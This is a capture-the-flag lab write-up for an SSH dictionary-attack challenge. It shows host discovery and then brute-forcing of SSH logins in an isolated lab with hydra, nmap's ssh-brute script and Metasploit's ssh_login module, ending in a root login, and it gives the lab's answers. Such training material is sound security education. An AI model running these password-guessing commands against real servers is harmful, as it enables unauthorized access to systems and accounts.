# SSH Recon: Dictionary Attack

### Overview

> In this challenge, we will look at the dictionary attacks on SSH server. Please start the lab and answer the following questions:
>
> **Questions**
>
> 1. Find the password of user “student” using hydra.
> 2. Find the password of user “administrator” use appropriate Nmap scripts with password dictionary: /usr/share/nmap/nselib/data/passwords.lst
> 3. Find the password of user “root” using ssh\_login Metasploit module with userpass dictionary: /usr/share/wordlists/metasploit/root\_userpass.txt
> 4. What is the message of the day? (Printed after the user logs in to the SSH server).
>
> Instructions:&#x20;
>
> * This lab is dedicated to you! No other users are on this network :)
> * Once you start the lab, you will have access to a root terminal of a Kali instance
> * Your Kali has an interface with IP address 192.X.Y.Z. Run "ip addr" to know the values of X and Y.
> * The Target machine should be located at the IP address 192.X.Y.3.
> * Do not attack the gateway located at IP address 192.X.Y.1



> 🔬 [SSH Recon: Dictionary Attack](https://attackdefense.com/challengedetails?cid=527)
>
> * Target IP: `192.207.120.3`
> * Detailed `SSH` Enumeration

```bash
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
207341: eth0@if207342: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:11 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.17/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
207344: eth1@if207345: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:cf:78:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.207.120.2/24 brd 192.207.120.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~# nmamp -sn 192.207.120.0/24
bash: nmamp: command not found
root@attackdefense:~# nmap -sn 192.207.120.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 07:20 UTC
Nmap scan report for eth0.gw.mmc.com.au (192.207.120.1)
Host is up (0.000064s latency).
MAC Address: 02:42:53:D7:1B:61 (Unknown)
Nmap scan report for target-1 (192.207.120.3)
Host is up (0.000013s latency).
MAC Address: 02:42:C0:CF:78:03 (Unknown)
Nmap scan report for attackdefense.com (192.207.120.2)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.05 seconds

root@attackdefense:~# nmap 192.207.120.3   
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 07:20 UTC
Nmap scan report for target-1 (192.207.120.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:C0:CF:78:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
```

> 1. Find the password of user `“student”` using hydra.

Answer: `login: student   password: friend`

```bash
root@attackdefense:~# gzip /usr/share/wordlists/rockyou.txt.gz 
gzip: /usr/share/wordlists/rockyou.txt.gz already has .gz suffix -- unchanged
root@attackdefense:~# gzip -d /usr/share/wordlists/rockyou.txt.gz 
root@attackdefense:~# hydra -l student -P /usr/share/wordlists/rockyou.txt 192.207.120.3 ssh
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-27 07:22:47
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.207.120.3:22/
[STATUS] 178.00 tries/min, 178 tries in 00:01h, 14344223 to do in 1343:06h, 16 active
[22][ssh] host: 192.207.120.3   login: student   password: friend
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 9 final worker threads did not complete until end.
[ERROR] 9 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-27 07:24:23
```

> 2. Find the password of user `“administrator”` use appropriate Nmap scripts with password dictionary: `/usr/share/nmap/nselib/data/passwords.lst`

Answer: `sunshine`

```bash
root@attackdefense:~# nmap --script ssh-brute --script-args userdb=/root/users, passdb=/usr/share/nmap/nselib/data/passwords.lst -p22 192.207.120.3
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 07:27 UTC
Unable to split netmask from target expression: "passdb=/usr/share/nmap/nselib/data/passwords.lst"
NSE: [ssh-brute] Trying username/password pair: administrator:administrator
NSE: [ssh-brute] Trying username/password pair: administrator:
NSE: [ssh-brute] Trying username/password pair: administrator:123456
NSE: [ssh-brute] Trying username/password pair: administrator:12345
NSE: [ssh-brute] Trying username/password pair: administrator:123456789
NSE: [ssh-brute] Trying username/password pair: administrator:password
NSE: [ssh-brute] Trying username/password pair: administrator:iloveyou
NSE: [ssh-brute] Trying username/password pair: administrator:princess
NSE: [ssh-brute] Trying username/password pair: administrator:12345678
NSE: [ssh-brute] Trying username/password pair: administrator:1234567
NSE: [ssh-brute] Trying username/password pair: administrator:abc123
NSE: [ssh-brute] Trying username/password pair: administrator:nicole
NSE: [ssh-brute] Trying username/password pair: administrator:daniel
NSE: [ssh-brute] Trying username/password pair: administrator:monkey
NSE: [ssh-brute] Trying username/password pair: administrator:babygirl
NSE: [ssh-brute] Trying username/password pair: administrator:qwerty
NSE: [ssh-brute] Trying username/password pair: administrator:lovely
NSE: [ssh-brute] Trying username/password pair: administrator:654321
NSE: [ssh-brute] Trying username/password pair: administrator:michael
NSE: [ssh-brute] Trying username/password pair: administrator:jessica
NSE: [ssh-brute] Trying username/password pair: administrator:111111
NSE: [ssh-brute] Trying username/password pair: administrator:ashley
NSE: [ssh-brute] Trying username/password pair: administrator:000000
NSE: [ssh-brute] Trying username/password pair: administrator:iloveu
NSE: [ssh-brute] Trying username/password pair: administrator:michelle
NSE: [ssh-brute] Trying username/password pair: administrator:tigger
NSE: [ssh-brute] Trying username/password pair: administrator:sunshine
NSE: [ssh-brute] Trying username/password pair: administrator:chocolate
NSE: [ssh-brute] Trying username/password pair: administrator:password1
NSE: [ssh-brute] Trying username/password pair: administrator:soccer
NSE: [ssh-brute] Trying username/password pair: administrator:anthony
NSE: [ssh-brute] Trying username/password pair: administrator:friends
Nmap scan report for target-1 (192.207.120.3)
Host is up (0.000036s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute: 
|   Accounts: 
|     administrator:sunshine - Valid credentials
|_  Statistics: Performed 32 guesses in 8 seconds, average tps: 4.0
MAC Address: 02:42:C0:CF:78:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 8.62 seconds
```

> 3. Find the password of user `“root”` using `ssh_login` Metasploit module with userpass dictionary: `/usr/share/wordlists/metasploit/root_userpass.txt`

Answer: `attack`

```bash
msf5 > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.207.120.3
RHOSTS => 192.207.120.3
msf5 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
USERPASS_FILE => /usr/share/wordlists/metasploit/root_userpass.txt
msf5 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf5 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
VERBOSE => true
msf5 auxiliary(scanner/ssh/ssh_login) > exploit

[-] 192.207.120.3:22 - Failed: 'root:'
[!] No active DB -- Credential data will not be saved!
[-] 192.207.120.3:22 - Failed: 'root:!root'
[-] 192.207.120.3:22 - Failed: 'root:Cisco'
[-] 192.207.120.3:22 - Failed: 'root:NeXT'
[-] 192.207.120.3:22 - Failed: 'root:QNX'
[-] 192.207.120.3:22 - Failed: 'root:admin'
[+] 192.207.120.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (192.207.120.2:45957 -> 192.207.120.3:22) at 2024-06-27 07:31:36 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> 4. What is the message of the day? (Printed after the user logs in to the SSH server).

Answer: `SSH recon dictionary attack lab`

```bash
root@attackdefense:~# ssh root@ 192.207.120.3
ssh: Could not resolve hostname : Name or service not known
root@attackdefense:~# ssh root@192.207.120.3
The authenticity of host '192.207.120.3 (192.207.120.3)' can't be established.
ECDSA key fingerprint is SHA256:dxlBXgBb0Iv5/LmemZ2Eikb5+GLl9CSLf/B854fUeV8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.207.120.3' (ECDSA) to the list of known hosts.
Ubuntu 16.04.5 LTS
root@192.207.120.3's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 5.4.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
SSH recon dictionary attack lab
root@victim-1:~# whoami
root
```











